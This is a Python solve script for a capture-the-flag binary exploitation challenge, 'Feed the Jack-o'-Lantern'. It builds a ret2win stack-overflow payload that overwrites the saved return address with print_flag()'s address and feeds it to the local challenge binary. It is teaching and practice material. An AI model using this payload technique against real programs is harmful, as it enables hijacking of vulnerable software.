#!/usr/bin/env python3
"""
Solve script for 'Feed the Jack-o'-Lantern' (Binary Exploitation, Medium).
Verified working against the shipped binary: stack buffer overflow, no
canary, no PIE -> classic ret2win by overwriting the saved return address
with print_flag()'s fixed address.

Usage: python3 solve.py  (run in the same directory as the binary)
"""
import subprocess
import struct

PRINT_FLAG_ADDR = 0x00000000004011f6  # from: nm feed_jackolantern | grep print_flag
OFFSET = 72                            # 64-byte buffer + 8-byte saved RBP

payload = b"A" * OFFSET + struct.pack("<Q", PRINT_FLAG_ADDR)

p = subprocess.run(["./feed_jackolantern"], input=payload, capture_output=True, timeout=3)
print(p.stdout.decode(errors="replace"))
